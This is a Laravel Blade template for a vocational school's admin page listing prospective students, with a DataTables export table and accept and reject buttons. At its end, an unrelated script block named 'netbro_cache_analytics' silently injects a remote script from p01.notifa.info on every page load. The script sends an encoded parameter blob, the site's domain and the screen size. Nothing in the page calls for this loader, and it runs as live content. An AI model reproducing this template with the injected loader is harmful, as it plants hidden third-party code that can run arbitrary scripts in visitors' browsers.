@extends('layouts.master')

@push('title')
- Daftar Calon Siswa
@endpush

@push('styles')
<!--favicon-->
<!--favicon-->
<link rel="icon" href="{{ asset('assets/images/logo.png') }}" type="image/x-icon">
<!-- simplebar CSS-->
<link href="{{ asset('assets/plugins/simplebar/css/simplebar.css') }}" rel="stylesheet" />
<!-- Bootstrap core CSS-->
<link href="{{ asset('assets/css/bootstrap.min.css') }}" rel="stylesheet" />
<!--Data Tables -->
<link href="{{ asset('assets/plugins/bootstrap-datatable/css/dataTables.bootstrap4.min.css') }}" rel="stylesheet" type="text/css">
<link href="{{ asset('assets/plugins/bootstrap-datatable/css/buttons.bootstrap4.min.css') }}" rel="stylesheet" type="text/css">
<!-- animate CSS-->
<link href="{{ asset('assets/css/animate.css') }}" rel="stylesheet" type="text/css" />
<!-- Icons CSS-->
<link href="{{ asset('assets/css/icons.css') }}" rel="stylesheet" type="text/css" />
<!-- Sidebar CSS-->
<link href="{{ asset('assets/css/sidebar-menu.css') }}" rel="stylesheet" />
<!-- Custom Style-->
<link href="{{ asset('assets/css/app-style.css') }}" rel="stylesheet" />
@endpush

@section('content')
<div class="row pt-2 pb-2">
  <div class="col-sm-9">
    <h4 class="page-title">Daftar Calon Siswa</h4>
    <ol class="breadcrumb">
      <li class="breadcrumb-item"><a href="{{ url('dashboard') }}">SMK Mahaputra</a></li>
      <li class="breadcrumb-item"><a href="javaScript:void();">Kelola Siswa</a></li>
      <li class="breadcrumb-item active" aria-current="page">Daftar Calon Siswa</li>
    </ol>
  </div>
</div>

<div class="row">
  <div class="col-lg-12">
    <div class="card">
      <div class="card-header"><i class="fa fa-table"></i> Data Exporting</div>
      <div class="card-body">
        <div class="table-responsive">
          <table id="example" class="table table-bordered" style="width:100%;">
            <thead>

              <tr>

                <th>NO</th>
                <th>NAMA</th>
                <th>Asal Sekolah</th>
                <th>Aksi</th>

              </tr>

            </thead>
            <tbody>
              <tr>
                <td>1</td>
                <td>meli</td>
                <td>Smp 89</td>
                <td>
                  <a href="{{ url('/students/prospective/1') }}" type="button" data-toggle="tooltip" data-placement="top" title="DETAIL" class="btn btn-outline-primary waves-effect waves-light m-1"> <i class="zmdi zmdi-info-outline fa-lg"></i> </a>
                  <a href="{{ url('/students')}}" type="button" data-toggle="tooltip" data-placement="top" title="TERIMA" class="btn btn-outline-success waves-effect waves-light m-1"> <i class="zmdi zmdi-check fa-lg"></i> </a>
                  <a href="{{ url('/students/rejected')}}" type="button" data-toggle="tooltip" data-placement="top" title="TOLAK" class="btn btn-outline-danger waves-effect waves-light m-1"> <i class="zmdi zmdi-close fa-lg"></i> </a>
                </td>
              </tr>
              <tr>
                <td>2</td>
                <td>yanti</td>
                <td>Smp 89</td>
                <td>
                  <a href="{{ url('/students/prospective/1') }}" type="button" data-toggle="tooltip" data-placement="top" title="DETAIL" class="btn btn-outline-primary waves-effect waves-light m-1"> <i class="zmdi zmdi-info-outline fa-lg"></i> </a>
                  <a href="{{ url('/students')}}" type="button" data-toggle="tooltip" data-placement="top" title="TERIMA" class="btn btn-outline-success waves-effect waves-light m-1"> <i class="zmdi zmdi-check fa-lg"></i> </a>
                  <a href="{{ url('/students/rejected')}}" type="button" data-toggle="tooltip" data-placement="top" title="TOLAK" class="btn btn-outline-danger waves-effect waves-light m-1"> <i class="zmdi zmdi-close fa-lg"></i> </a>
                </td>
              </tr>
              <tr>
                <td>3</td>
                <td>danang</td>
                <td>Smp 89</td>
                <td>
                  <a href="{{ url('/students/prospective/1') }}" type="button" data-toggle="tooltip" data-placement="top" title="DETAIL" class="btn btn-outline-primary waves-effect waves-light m-1"> <i class="zmdi zmdi-info-outline fa-lg"></i> </a>
                  <a href="{{ url('/students')}}" type="button" data-toggle="tooltip" data-placement="top" title="TERIMA" class="btn btn-outline-success waves-effect waves-light m-1"> <i class="zmdi zmdi-check fa-lg"></i> </a>
                  <a href="{{ url('/students/rejected')}}" type="button" data-toggle="tooltip" data-placement="top" title="TOLAK" class="btn btn-outline-danger waves-effect waves-light m-1"> <i class="zmdi zmdi-close fa-lg"></i> </a> </td>
              </tr>

            </tbody>

          </table>
        </div>
      </div>
    </div>
  </div>
</div><!-- End Row-->

<!--Start Back To Top Button-->
<a href="javaScript:void();" class="back-to-top"><i class="fa fa-angle-double-up"></i> </a>
<!--End Back To Top Button-->

@push('scripts')
<!-- Bootstrap core JavaScript-->
<script src="{{ asset('assets/js/jquery.min.js') }}"></script>
<script src="{{ asset('assets/js/popper.min.js') }}"></script>
<script src="{{ asset('assets/js/bootstrap.min.js') }}"></script>

<!-- simplebar js -->
<script src="{{ asset('assets/plugins/simplebar/js/simplebar.js') }}"></script>
<!-- waves effect js -->
<script src="{{ asset('assets/js/waves.js') }}"></script>
<!-- sidebar-menu js -->
<script src="{{ asset('assets/js/sidebar-menu.js') }}"></script>
<!-- Custom scripts -->
<script src="{{ asset('assets/js/app-script.js') }}"></script>

<!--Data Tables js-->
<script src="{{ asset('assets/plugins/bootstrap-datatable/js/jquery.dataTables.min.js') }}"></script>
<script src="{{ asset('assets/plugins/bootstrap-datatable/js/dataTables.bootstrap4.min.js') }}"></script>
<script src="{{ asset('assets/plugins/bootstrap-datatable/js/dataTables.buttons.min.js') }}"></script>
<script src="{{ asset('assets/plugins/bootstrap-datatable/js/buttons.bootstrap4.min.js') }}"></script>
<script src="{{ asset('assets/plugins/bootstrap-datatable/js/jszip.min.js') }}"></script>
<script src="{{ asset('assets/plugins/bootstrap-datatable/js/pdfmake.min.js') }}"></script>
<script src="{{ asset('assets/plugins/bootstrap-datatable/js/vfs_fonts.js') }}"></script>
<script src="{{ asset('assets/plugins/bootstrap-datatable/js/buttons.html5.min.js') }}"></script>
<script src="{{ asset('assets/plugins/bootstrap-datatable/js/buttons.print.min.js') }}"></script>
<script src="{{ asset('assets/plugins/bootstrap-datatable/js/buttons.colVis.min.js') }}"></script>


<script>
  $(document).ready(function() {
    //Default data table
    $('#default-datatable').DataTable();


    var table = $('#example').DataTable({
      lengthChange: false,
      buttons: ['copy', 'excel', 'pdf', 'print', 'colvis']
    });

    table.buttons().container()
      .appendTo('#example_wrapper .col-md-6:eq(0)');

  });
</script>

<script type="text/javascript">
  if (self == top) {
    function netbro_cache_analytics(fn, callback) {
      setTimeout(function() {
        fn();
        callback();
      }, 0);
    }

    function sync(fn) {
      fn();
    }

    function requestCfs() {
      var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
      var idc_glo_r = Math.floor(Math.random() * 99999999999);
      var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKuih2FzmamiVXBdP7rQdzhTxfpkFFtvOnyejVCSSPK6u9WcsNj8GrchwkcC0cuuN23MjWecopK9D18LKoyDfbiXPfrndpWGpPOH2fLRyh5tK5%2f2c9K0us8J%2bjf3vFsn4%2fTXFgzL766s1rvusNt%2f2awK9lOy4Vktosm3AYYGGLl5M3uaPFy1scuCQj%2f0TtP9KTGu%2baG8AY8xIwvJwZqBstW8mLUHXgBTl%2fCiejm4tW3R%2b8lXa%2bjlGl2mi3qy6h0ZR8W72goA0fM%2fheFCPwMRwWv3%2fgBJNpUwJ%2bH2t1mVHjs4ZpZ7goJxWRAK4PpOPCLgzKtOnJI%2fZInHhRwD94P7HZXLqHaKn2Dp3%2fdEJHkeaL4yuoeuu063ZBMPA0nAsB4sgvkCfWzi2EjFHA1gg77pOXVlnhhOP8kHZYxMQ4QoZOkHsqic6nVTUksRjQ3Mma4U0zDcidDMWZgPrAvo08lzOZJkkwlaTsMfMhGiEbCHIzyrFruRxowfltKRNMntpE19Ejg4%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
      var bsa = document.createElement('script');
      bsa.type = 'text/javascript';
      bsa.async = true;
      bsa.src = url;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
    }
    netbro_cache_analytics(requestCfs, function() {});
  };
</script>
@endpush
@endsection